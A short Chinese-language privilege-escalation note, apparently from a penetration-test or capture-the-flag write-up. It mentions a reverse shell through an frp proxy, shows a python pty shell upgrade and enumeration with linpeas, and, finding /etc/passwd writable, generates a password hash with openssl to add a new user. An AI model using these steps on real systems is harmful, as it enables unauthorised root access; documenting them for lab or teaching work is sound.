权限提升

先反弹 shell 到跳板机上，我用的是frp反向代理

python -c 'import pty; pty.spawn("/bin/sh") '

进行一些信息搜集，上lineas

本用户对 /etc/passwd 有写权限

创建一个新用户x1nri，密码为123

$ openssl passwd -1 -salt x1nri 123
$1$x1nri$RuLBMKXnN1w.xtGk5bIT21
